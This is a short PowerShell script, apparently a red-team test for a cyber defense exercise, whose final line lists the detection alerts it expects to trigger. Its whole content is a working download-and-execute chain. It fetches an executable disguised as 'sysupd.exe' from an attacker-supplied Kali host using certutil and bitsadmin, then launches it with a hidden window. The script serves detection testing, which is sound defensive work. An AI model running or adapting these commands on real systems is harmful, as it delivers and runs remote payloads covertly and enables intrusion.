param([Parameter(Mandatory=$true)][string]$Kali, [int]$Port = 8000)
Write-Host "[1] certutil fetch..."
certutil -urlcache -f "http://${Kali}:${Port}/sysupd.exe" C:\Users\Public\sysupd.exe
Write-Host "[2] bitsadmin fetch..."
bitsadmin /transfer CCDCTestDl /download /priority high `
  "http://${Kali}:${Port}/sysupd.exe" C:\Users\Public\sysupd2.exe
Write-Host "[3] launching one of them..."
if (Test-Path C:\Users\Public\sysupd.exe) { Start-Process C:\Users\Public\sysupd.exe -WindowStyle Hidden }
Write-Host "expect PROC-LOLBIN-DOWNLOAD on 1+2; SIG-*/EVT-4688-TEMP/PROG-IMPLANT-LAUNCH on 3"
